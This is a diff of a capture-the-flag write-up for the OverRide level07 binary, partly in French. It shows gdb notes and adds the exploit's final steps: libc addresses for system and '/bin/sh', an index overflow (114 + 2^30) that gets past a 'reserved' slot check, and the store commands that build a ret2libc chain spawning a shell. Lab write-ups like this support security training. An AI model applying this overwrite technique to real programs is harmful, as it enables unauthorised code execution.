@@ -1,21 +1,3 @@
-gdb) break main
-Breakpoint 1 at 0x8048729
-(gdb) run
-Starting program: /home/users/level07/level07 
-
-Breakpoint 1, 0x08048729 in main ()
-(gdb) /x $ebp
-Undefined command: "".  Try "help".
-(gdb) p/x $ebp
-$1 = 0xffffd718
-
-p/x $ebp → 0xffffd718
-
-BASE = ebp - 0x1bc → 0xffffd55c
-RET_ADDR = ebp + 4 → 0xffffd71c
-RET_INDEX = 112
-
-
 ```bash
 level07@OverRide:~$ gdb level07 
 (gdb) b store_number # store_number's call
@@ -62,3 +44,19 @@ offset index = (return address - base) / 4
 
 system = 0xf7f897ec = 4160264172
 "/bin/sh" = 0xf7e6aed0 = 4159090384
+
+114 ≡ 0 (mod 3) → bloqué par “reserved for wil”. Utilise l’index équivalent 114 + 2^30 = 1073741938
+
+```bash
+Input command: store
+Number: 4159090384
+Index: 1073741938      # 114 + 2^30
+
+Input command: store
+Number: 1094795585 # facultatif
+Index: 115
+
+Input command: store
+Number: 4160264172
+Index: 116
+```
